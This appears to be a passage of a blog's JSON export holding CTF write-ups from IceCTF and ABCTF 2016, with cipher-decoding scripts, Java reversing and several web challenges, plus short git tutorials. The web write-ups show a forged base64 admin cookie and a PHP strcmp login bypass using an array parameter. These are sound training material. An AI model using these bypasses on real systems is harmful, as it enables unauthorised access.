methods","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"reconnaissance","slug":"reconnaissance","permalink":"https://rawsec.ml/tags/reconnaissance/"}]},{"title":"IceCTF - 40 - Alien Message - Cryptography","slug":"IceCTF-2016-IceCTF-40-Alien-Message-Cryptography","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.508Z","comments":true,"path":"en/IceCTF-2016-IceCTF-40-Alien-Message-Cryptography/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-40-Alien-Message-Cryptography/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description We found this suspicous image online and it looked like it had been planted there by an alien life form. Can you see if you can figure out what they're trying to tell us? Solution I was pretty sure this picture contein normal text written with a special font so I began to look for alien font/code. Thanks to this article I found it was the Alienese I font from Futurama. Quote from futurama.wikia.com: The first language, a simple substitution cipher, was solved almost instantly. So I looked for decoders for a faster result: I found one here cs.oswego.edu and one here gotfuturama.com Flag: IceCTF{good_n3wz_3veryon3_1_l1k3_fu7ur4ma_4nd_th3ir_4maz1ng_3as7er_39g5} POV: This challenge? Cryptography? Really? ... I deplore to still have this kind of challenge in CTF. That's nothing but a lost of time and that have nothing to do with security. That's even not stego because from the beginning we know that's just a font, it's just pain!","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 35 - IRC I - Misc","slug":"IceCTF-2016-IceCTF-35-IRC-1-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.492Z","comments":true,"path":"en/IceCTF-2016-IceCTF-35-IRC-1-Misc/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-35-IRC-1-Misc/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description There is someone sharing flags on our IRC server, can you find him and stop him? glitch.is:6667 Solution Connect to the IRC server (ex: with mibbit if you have no IRC client installed). On glitch.is home use the /list to list all the channels on the server. There is a channel named #6470e394cb_flagshare. Join it /join #6470e394cb_flagshare. Display the topic /topic which is Get your flags here! while they're hot! IceCTF{pL3AsE_D0n7_5h4re_fL495_JUsT_doNT}. Note: Here a List of IRC commands","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"IceCTF - 30 - Substituted - Cryptography","slug":"IceCTF-2016-IceCTF-30-Substituted-Cryptography","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.455Z","comments":true,"path":"en/IceCTF-2016-IceCTF-30-Substituted-Cryptography/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-30-Substituted-Cryptography/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description We got a substitute flag, I hear they are pretty lax on the rules... crypted.txt Solution It's a substitution cipher. I used The Black Chamber for frequence analysis. And then I continued to analyze manually with the help of my tool: 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/pythonimport sysimport stringalphabet_letters = string.ascii_letters# ciphered_text:plain_text (c:v)substitution_dict = &#123;'a':'p' ,'b':'b' ,'c':'m', 'd':'s', 'e':'o', 'f':'*', 'g':'w', 'h':'*', 'i':'k', 'j':'a', 'k':'t', 'l':'h', 'm':'n', 'n':'*', 'o':'r', 'p':'*', 'q':'g', 'r':'y', 's':'u', 't':'f', 'u':'d', 'v':'c', 'w':'i', 'x':'v', 'y':'e', 'z':'l'&#125;alphabet_substituted = \"\"for c in alphabet_letters: if c in string.ascii_lowercase: alphabet_substituted += substitution_dict[c] elif c in string.ascii_uppercase: if substitution_dict[c.lower()] is not '*': alphabet_substituted += substitution_dict[c.lower()].upper() else: alphabet_substituted += substitution_dict[c.lower()]with open(\"crypted.txt\", \"r\") as fh: encoded_data = fh.read()if (sys.version_info &gt; (3, 0)): # made with python 3.5.2 table = str.maketrans(alphabet_letters, alphabet_substituted)else: # made with python 2.7.12 table = string.maketrans(alphabet_letters, alphabet_substituted)decoded_data = encoded_data.translate(table)print(\"=== Encoded data ===\")print(encoded_data)print(\"=== Decoded data ===\")print(decoded_data) And I executed it: 12345678910111213141516171819python substitution.py=== Encoded data ===Lw!Gyzvecy ke WvyVKT!W&apos;zz by reso dsbdkwksky tzjq teo kly ujr. Teo keujr, gy joy dksurwmq bjdwv vorakeqojalr jmu wkd jaazwvjkwemd. Vorakeqojalr ljd j zemq lwdkeor, jzklesql gwkl kly juxymk et vecaskyod wk ljd qekkym oyjzzr vecazwvjkyu. Decy dwcazy ezu vwalyod joy kly Vjydjo vwalyo, kly Xwqymyoy vwalyo, kly dsbdkwkskwem vwalyo, glwvl wd klwd emy, jmu de em. Jzcedk jzz et klydy vwalyod joy yjdwzr boeiym keujr gwkl kly lyza et vecaskyod. Decy myg ymvorakwem cykleud joy JYD, kly vsooymk dkjmujou teo ymvorakwem, jzemq gwkl ODJ. Vorakeqojalr wd j xjdk twyzu jmu wd xyor wmkyoydkwmq klesql. De iwvi bjvi, oyju sa em decy veez vwalyod jmu ljxy tsm!El jmu teo reso oyveoud cr mjcy wd WvyVKT&#123;jzgjrd_zwdkym_ke_reso_dsbdkwksky_tzjqd&#125;.=== Decoded data ===Hi!Welcome to IceCTF!I&apos;ll be your substitute flag for the day. For today, we are studying basic cryptography and its applications. Cryptography has a long history, although with the advent of computers it has gotten really complicated. Some simple old ciphers are the Caesar cipher, the Vigenere cipher, the substitution cipher, which is this one, and so on. Almost all of these ciphers are easily broken today with the help of computers. Some new encryption methods are AES, the current standard for encryption, along with RSA. Cryptography is a vast field and is very interesting though. So kick back, read up on some cool ciphers and have fun!Oh and for your records my name is IceCTF&#123;always_listen_to_your_substitute_flags&#125;.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 30 - Move Along - Web","slug":"IceCTF-2016-IceCTF-30-Move-Along-Web","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.475Z","comments":true,"path":"en/IceCTF-2016-IceCTF-30-Move-Along-Web/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-30-Move-Along-Web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description This site seems awfully suspicious, do you think you can figure out what they're hiding? Solution Display source code CTRL + U. The page is only including an image http://move-along.vuln.icec.tf/move_along/nothing-to-see-here.jpg. See the move_along/ sub-folder and go in it move_along/ Nginx listing functionnality is not disabled so we can see there is a sub-folder [0f76da769d67e021518f05b552406ff6/][secretfolde] (dirb won't work). There is a secret image secret.jpg containing the flag IceCTF{tH3_c4t_15_Ou7_oF_THe_b49}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 20 - Rotated! - Cryptography","slug":"IceCTF-2016-IceCTF-20-Rotated-Cryptograhy","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.515Z","comments":true,"path":"en/IceCTF-2016-IceCTF-20-Rotated-Cryptograhy/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-20-Rotated-Cryptograhy/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description They went and ROTated the flag by 5 and then ROTated it by 8! The scoundrels! Anyway once they were done this was all that was left VprPGS{jnvg_bar_cyhf_1_vf_3?} Solution A ROT13 Caesar cipher again. 5 + 8 = 13 right? Let's use a script: 1234567891011121314151617181920212223242526#!/usr/bin/pythonimport sysimport stringdef caesar(plaintext, shift): alphabet_lower = string.ascii_lowercase alphabet_upper = string.ascii_uppercase shifted_alphabet_lower = alphabet_lower[shift:] + alphabet_lower[:shift] shifted_alphabet_upper = alphabet_upper[shift:] + alphabet_upper[:shift] alphabet = alphabet_lower + alphabet_upper shifted_alphabet = shifted_alphabet_lower + shifted_alphabet_upper if (sys.version_info &gt; (3, 0)): # made with python 3.5.2 table = str.maketrans(alphabet, shifted_alphabet) else: # made with python 2.7.12 table = string.maketrans(alphabet, shifted_alphabet) return plaintext.translate(table)rot = 'VprPGS&#123;jnvg_bar_cyhf_1_vf_3?&#125;'print(caesar(rot, 5 + 8)) Flag: IceCTF{wait_one_plus_1_is_3?}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 10 - Spotlight - Web","slug":"IceCTF-2016-IceCTF-10-Spotlight-Web","date":"2016-08-15T22:00:00.000Z","updated":"2017-02-07T18:23:37.452Z","comments":true,"path":"en/IceCTF-2016-IceCTF-10-Spotlight-Web/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-10-Spotlight-Web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description Someone turned out the lights and now we can't find anything. Send halp! spotlight Solution That's a little JS script that spotlight where the mouse is focused. CTRL + U ans show sources to find the JS script. The JS script is located at [this link][link js]. And we find this line: 1console.log(\"DEBUG: IceCTF&#123;5tup1d_d3v5_w1th_th31r_l095&#125;\");","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"Adding an existing local project to a new remote git repository","slug":"adding-existing-local-new-remote-repository-git","date":"2016-07-27T22:00:00.000Z","updated":"2017-02-07T18:23:37.245Z","comments":true,"path":"en/adding-existing-local-new-remote-repository-git/","link":"","permalink":"https://rawsec.ml/en/adding-existing-local-new-remote-repository-git/","excerpt":"","text":"You want to put your project on a remote Git repository like GitHub, Bitbucket, Gitlab or Gogs to share and collaborate? Follow the following steps: Create a new repository on one of the git service quoted before and let it empty. In your terminal, go into your local project. Initialize the local repository as a Git repository: git init Add the wanted files in the your local repository with git add file or add the entire repository with git add .. Files will be staged for the first commit. Commit the staged files: git commit -m &quot;first commit&quot;. In your terminal, add the URL of the remote repository: git remote add origin https://example.com/examle.git. And push the changes to the remote Git repository: git push -u origin master.","categories":[{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/categories/misc/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"git","slug":"git","permalink":"https://rawsec.ml/tags/git/"}]},{"title":"Creating a simple python package with Distutils and upload it to PyPI","slug":"creating-python-package-distutils-pypi","date":"2016-07-26T22:00:00.000Z","updated":"2017-02-07T18:23:37.185Z","comments":true,"path":"en/creating-python-package-distutils-pypi/","link":"","permalink":"https://rawsec.ml/en/creating-python-package-distutils-pypi/","excerpt":"","text":"I made a quick summurizing slideshow on how to create a simple python package with Distutils and upload it to PyPI. Ressources: Slidehow Slideshow sources Package example","categories":[{"name":"programming","slug":"programming","permalink":"https://rawsec.ml/categories/programming/"},{"name":"python","slug":"programming/python","permalink":"https://rawsec.ml/categories/programming/python/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"programming","slug":"programming","permalink":"https://rawsec.ml/tags/programming/"},{"name":"python","slug":"python","permalink":"https://rawsec.ml/tags/python/"}]},{"title":"Deploying a subfolder to GitHub Pages","slug":"deploying-subfolder-github-pages","date":"2016-07-26T22:00:00.000Z","updated":"2017-02-07T18:23:37.222Z","comments":true,"path":"en/deploying-subfolder-github-pages/","link":"","permalink":"https://rawsec.ml/en/deploying-subfolder-github-pages/","excerpt":"","text":"You are building a website with a static site generator like Hexo or Jekyll? You want to have website source code on GitHub and the website running on gh-pages without maintaining two Git repository? You need subtree! You are making slideshows with Reveal.js? You want to have slideshow source code on GitHub and the slideshow running on gh-pages without maintaining two Git repository? You need subtree! Sometimes it's useful to have a subfolder on gh-pages and all the source code on the master branch and all of that in the same root directory. In fact for all project that you want to see his source code hosted on GitHub and the building result living on gh-pages. For this example, I suppose you have a build folder under the project's root directory. Remove the build folder from the project's .gitignore file. Make git aware of the build folder: 12git add buildgit commit -m &quot;Preparing build/ for subtree&quot; Each time you re-build the project to a final release, use subtree push to send the build on the gh-pages branch on GitHub: 1git subtree push --prefix build origin gh-pages","categories":[{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/categories/misc/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"git","slug":"git","permalink":"https://rawsec.ml/tags/git/"}]},{"title":"ABCTF - 15 - Virtual Box 2 - Virtual Series","slug":"ABCTF-2016-ABCTF-15-Virtual-Box-2-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.402Z","comments":true,"path":"en/ABCTF-2016-ABCTF-15-Virtual-Box-2-Virtual-Series/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-15-Virtual-Box-2-Virtual-Series/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description Darn, I found this flag so I put it in flag 1.doc but I can't seem to be able to see it anymore. Solution Go into C:\\WINDOWS\\Desktop\\flag 1.doc Edit &gt; Select All &gt; Color &gt; Black You now see ABCTF{H1DDEN_AWAY}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 35 - Virtual Box 3 - Virtual Series","slug":"ABCTF-2016-ABCTF-35-Virtual-Box-3-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.378Z","comments":true,"path":"en/ABCTF-2016-ABCTF-35-Virtual-Box-3-Virtual-Series/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-35-Virtual-Box-3-Virtual-Series/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description This mysterious file was left here, but I have no idea how to open it. Do you? I left it in a folder named 2016 just for you. Solution Go to C:\\My Documents\\2016 and there is flagfour.xlsx but we don't have Excel Extract the file with a floppy disk On your host create a floppy disk: fallocate -l 1474560 floppy.vfd Mount it on the Win98 VM Format it Copy flagfour.xlsx on it Eject the floppy Retrieve the file on your host Mount the image with a loopback device: sudo mount -o loop floppy.vfd /tmp/floppy Open with libreoffice libreoffice /tmp/floppy/flagfour.xlsx Content is ABCTF{FR0M_THE_FUTURE} Enjoy the flag!","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 50 - Drive Home - Reconaissance","slug":"ABCTF-2016-ABCTF-50-Drive-Home-Reconaissance","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.412Z","comments":true,"path":"en/ABCTF-2016-ABCTF-50-Drive-Home-Reconaissance/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-50-Drive-Home-Reconaissance/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description We found this link scribbled on a piece of paper: document/1_TxYCrk5vIMlUjiB1OioXmR7b-Uq_a9aPIh9JyYlPNs/edit?usp=sharing. It is broken but we need you to fix it! Solution It's a google drive link, so modify the given link to get: https://docs.google.com/document/d/1_TxYCrk5vIMlUjiB1OioXmR7b-Uq_a9aPIh9JyYlPNs/edit?usp=sharing Flag is abctf{g00gle_driv3_1s_my_f4v0r1t3}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"guessing","slug":"guessing","permalink":"https://rawsec.ml/tags/guessing/"}]},{"title":"ABCTF - 50 - Java Madness - Reverse Engineering","slug":"ABCTF-2016-ABCTF-50-Java-Madness-Reverse-Engineering","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.405Z","comments":true,"path":"en/ABCTF-2016-ABCTF-50-Java-Madness-Reverse-Engineering/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-50-Java-Madness-Reverse-Engineering/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description Hey if you can get [this][this] to pass some tests you could probably have the flag. [this]:https://mega.nz/#!DpVk3QII!0q_VFSxC2v0bjwodRIPT2UhJTTK3qvYsDMD7JL3qfPo Solution Here is the java source code: 12345678910111213141516171819202122232425262728public class what_the_hack &#123; public static void main(String[] args) &#123; String check = \"\"; if(args.length != 5)&#123; System.out.println(\"Almost! (;\"); &#125; else &#123; for(int i = args.length - 1; i &gt;= 0; i--)&#123; System.out.println(i); for(int j = args[i].length() - 1; j &gt;= 0; j--)&#123; check += args[i].charAt(j); System.out.println(args[i].charAt(j)); &#125; &#125; if(check.equals(\"abctf is the coolest ctf\"))&#123; System.out.println(\"Flag: \" + \"ABCTF&#123;\" + args[0] + args[1] + args[2] +args[3] + args[4] + \"&#125;\"); &#125; else&#123; System.out.println(check); &#125; &#125; &#125;&#125; Compile the code: javac what_the_hack.java Run it: 12java what_the_hackAlmost! (; Analyse the code, there must be 5 strings args: 123456789101112java what_the_hack a b c d e4e3d2c1b0aedcba By analysing the code we understand that the software display the position of the arg and is content in the reverse order and that the valid check must be abctf is the coolest ctf So write abctf is the coolest ctf to reverse it: 123456789101112131415161718192021222324252627java what_the_hack abctf is the coolest ctf4ftc3tselooc2eht1si0ftcbaftctseloocehtsiftcba ftctseloocehtsiftcba is the reverse but we need to space it: 12345678910111213141516171819202122232425262728293031java what_the_hack &apos;ftc&apos; &apos; tselooc&apos; &apos; eht&apos; &apos; si&apos; &apos; ftcba&apos;4abctf3is2the1coolest0ctfFlag: ABCTF&#123;ftc tselooc eht si ftcba&#125; We got it!","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"reverse","slug":"reverse","permalink":"https://rawsec.ml/tags/reverse/"}]},{"title":"ABCTF - 50 - Chocolate - Web Exploitation","slug":"ABCTF-2016-ABCTF-50-Chocolate-Web-Exploitation","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.415Z","comments":true,"path":"en/ABCTF-2016-ABCTF-50-Chocolate-Web-Exploitation/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-50-Chocolate-Web-Exploitation/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description If you could become admin you would get a flag. Link Solution Launch Element Inspector of Firefox or the Firebug addon and use the network analyser. See the request cookie e2FkbWluOmZhbHNlfQ== Un-base64 it: 12echo -n &quot;e2FkbWluOmZhbHNlfQ==&quot; | base64 -d &amp;&amp; echo &quot;&quot;&#123;admin:false&#125; Edit the cookie and change the value to {admin:true} in base64 12echo -n &quot;&#123;admin:true&#125;&quot; | base64e2FkbWluOnRydWV9 Send it again with a proxy tool like Burp, ZAP, Temper Data And TADA! We get into the admin page: Wow! You're an admin, maybe. Well anyway, here is your flag, ABCTF{don't_trust_th3_coooki3}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 70 - L33t H4xx0r - Web Exploitation","slug":"ABCTF-2016-ABCTF-70-L33t-H4xx0r-Web-Exploitation","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.415Z","comments":true,"path":"en/ABCTF-2016-ABCTF-70-L33t-H4xx0r-Web-Exploitation/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-70-L33t-H4xx0r-Web-Exploitation/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description If you could bypass the login you could get the flag. Link [this]:http://yrmyzscnvh.abctf.xyz/web6/ Hint: Some ways of comparing two strings are very insecure. Solution Look at page source code See the comment: source.txt So go to http://yrmyzscnvh.abctf.xyz/web6/source.txt and see the server side source code: 123456789101112131415161718&lt;?php $FLAGWEB6 = (file_get_contents(\"flag.txt\")); $PASSWORD = (file_get_contents(\"flag.txt\")); //haha if(isset($_GET['password']))&#123; if(strcmp($PASSWORD, $_GET['password']) == 0)&#123; $success = true; &#125; else&#123; $success = false; &#125; &#125; else &#123; $success = false; &#125;?&gt; The vulnerability come from the usage of strcmp php function. Normally return 0 if two strings are equals. But if one of the two operators is not a string some weird behaviour can happen. For example if you compare a string and an array it returns NULL + PHP Warning: 12strcmp(&quot;foo&quot;, array()) =&gt; NULL + PHP Warningstrcmp(&quot;foo&quot;, new stdClass) =&gt; NULL + PHP Warning So we can bypass if(strcmp($PASSWORD, $_GET['password']) == 0) and change it to if(NULL == 0) And thanks to PHP native weakness NULL == 0 return True. More details So now we just have to forge a GET request giving an array: http://yrmyzscnvh.abctf.xyz/web6/?password[]=&quot;&quot;. Why? What is that? Transforming ?password=value to ?password[]=value will pass an array instead of a simple value so ?password[]=&quot;&quot; will give an empty array. Flag is abctf{always_know_whats_going_on}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 10 - Caesar Salad - Cryptography","slug":"ABCTF-2016-ABCTF-10-Caesar-Salad-Cryptography","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.392Z","comments":true,"path":"en/ABCTF-2016-ABCTF-10-Caesar-Salad-Cryptography/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-10-Caesar-Salad-Cryptography/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description Most definitely the best salad around. Can you decrypt this for us? xyzqc{t3_qelrdeq_t3_k33a3a_lk3_lc_qe3p3} Solution Caesar cipher again. ROT-3: abctf{w3_thought_w3_n33d3d_on3_of_th3s3}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 10 - Elemental - Web Exploitation","slug":"ABCTF-2016-ABCTF-10-Elemental-Web-Exploitation","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.392Z","comments":true,"path":"en/ABCTF-2016-ABCTF-10-Elemental-Web-Exploitation/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-10-Elemental-Web-Exploitation/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description Just put in the password for the flag! Link Solution Display source code CTRL + U 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;/html&gt;&lt;html&gt; &lt;head&gt; &lt;link rel=\"stylesheet\" href=\"main.css\"&gt; &lt;link href='https://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'&gt; &lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js\"&gt;&lt;/script&gt; &lt;link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.6/css/materialize.min.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col l6 push-l3\"&gt; &lt;center&gt;&lt;h3 class=\"white-text\"&gt;Web 1&lt;/h3&gt;&lt;br&gt;&lt;h3 class=\"white-text\"&gt;Simple&lt;/h3&gt;&lt;/center&gt; &lt;/div&gt; &lt;/div&gt; &lt;div style=\"margin-top: 20%\" class=\"row\"&gt; &lt;div class=\"col l4 push-l4\"&gt; &lt;form action=\".\" method=\"post\"&gt; &lt;h5 class=\"white-text\"&gt;Password: &lt;/h5&gt; &lt;input type=\"password\" name=\"password\" required&gt; &lt;input id=\"submit\" type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; 